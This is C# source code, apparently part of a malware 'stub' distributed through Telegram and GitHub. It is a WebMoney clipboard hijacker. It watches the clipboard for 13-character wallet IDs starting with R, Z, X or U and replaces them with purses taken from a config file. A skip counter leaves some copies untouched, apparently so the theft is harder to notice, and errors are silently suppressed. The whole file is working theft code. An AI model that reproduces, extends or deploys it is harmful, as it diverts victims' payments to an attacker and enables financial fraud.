/* 
    Author : Megavolt
	Telegram Group : t.me/DOLFX
    Github : github.com/Megavolt666
	Telegram Author : t.me/megavoltcoder
*/
using System.Windows.Forms;

namespace stubOnion
{
    class WebMoney
    {
        public static int _oppToMiss;
        public static void GetWebMoney()
        {
            try
            {
                if (Clipboard.ContainsText())
                {
                    var clpbrd = Clipboard.GetText();

                    if (clpbrd.Length == 13)
                    {
                        if (clpbrd[0].ToString() == "R")
                        {
                            if (_oppToMiss > 0)
                            {
                                _oppToMiss--;
                                return;
                            }
                            _oppToMiss = Config.OppToMissDef;
                            Clipboard.SetText(Config.wmr);
                        }
                        else { }

                        if (clpbrd[0].ToString() == "Z")
                        {
                            if (_oppToMiss > 0)
                            {
                                _oppToMiss--;
                                return;
                            }
                            _oppToMiss = Config.OppToMissDef;
                            Clipboard.SetText(Config.wmz);
                        }
                        else { }

                        if (clpbrd[0].ToString() == "X")
                        {
                            if (_oppToMiss > 0)
                            {
                                _oppToMiss--;
                                return;
                            }
                            _oppToMiss = Config.OppToMissDef;
                            Clipboard.SetText(Config.wmx);
                        }
                        else { }

                        if (clpbrd[0].ToString() == "U")
                        {
                            if (_oppToMiss > 0)
                            {
                                _oppToMiss--;
                                return;
                            }
                            _oppToMiss = Config.OppToMissDef;
                            Clipboard.SetText(Config.wmu);
                        }
                        else { }
                    }
                    else
                    {
                        return;
                    }

                }
                else
                {
                    return;
                }
            }
            catch { }
        }
    }
}
